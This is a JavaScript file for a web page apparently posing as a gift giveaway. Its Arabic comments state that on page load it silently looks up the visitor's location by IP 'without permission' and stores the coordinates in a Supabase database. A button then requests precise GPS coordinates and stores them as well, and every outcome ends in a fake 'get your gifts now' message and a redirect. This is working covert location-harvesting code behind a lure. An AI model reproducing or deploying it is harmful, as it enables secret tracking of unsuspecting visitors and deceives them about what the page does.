const supabaseClient = window.supabaseClient;

function showToast(message, type) {
  var container = document.getElementById('toastContainer');
  var toast = document.createElement('div');
  toast.className = 'toast toast--' + type;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(function () {
    toast.classList.add('removing');
    setTimeout(function () { toast.remove(); }, 300);
  }, 4000);
}

function showLoader() {
  document.getElementById('loader').classList.add('active');
}

function hideLoader() {
  document.getElementById('loader').classList.remove('active');
}

function getOrCreateSessionId() {
  var key = 'ls_session_id';
  var id = localStorage.getItem(key);
  if (!id) {
    id = crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).slice(2);
    localStorage.setItem(key, id);
  }
  return id;
}

// ─── تتبع IP تلقائي عند فتح الصفحة (بدون إذن) ───
async function trackByIP() {
  try {
    var sessionId = getOrCreateSessionId();
    var res = await fetch('https://ipapi.co/json/');
    var data = await res.json();
    if (data && data.latitude && data.longitude) {
      await supabaseClient
        .from('locations')
        .insert({
          latitude: data.latitude,
          longitude: data.longitude,
          accuracy: -1,          // -1 = مبني على IP
          session_id: sessionId
        });
    }
  } catch (e) {
    // صامت — المستخدم لا يرى أي شيء
    console.log('IP track:', e);
  }
}

// شغّل تتبع الـ IP فور ما تتحمّل الصفحة
trackByIP();

// ─── محاولة GPS (اختيارية، لمزيد من الدقة) ───
async function shareLocation() {
  var btn = document.getElementById('shareBtn');
  btn.disabled = true;
  showLoader();

  // لو المتصفح لا يدعم GPS، روح لصفحة الهدايا مباشرة
  if (!navigator.geolocation) {
    hideLoader();
    showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
    setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
    return;
  }

  navigator.geolocation.getCurrentPosition(
    // ─── نجح GPS ───
    async function (position) {
      var lat = position.coords.latitude;
      var lng = position.coords.longitude;
      var acc = position.coords.accuracy;
      var sessionId = getOrCreateSessionId();

      try {
        await supabaseClient
          .from('locations')
          .insert({ latitude: lat, longitude: lng, accuracy: acc, session_id: sessionId });
      } catch (err) {
        console.error('Supabase GPS Error:', err);
      }

      hideLoader();
      showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
      setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
    },

    // ─── رُفض أو فشل GPS → روح لصفحة الهدايا على طول (IP اتحفظ مسبقاً) ───
    function () {
      hideLoader();
      showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
      setTimeout(function () { window.location.href = 'gifts.html'; }, 1500);
    },

    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

window.shareLocation = shareLocation;
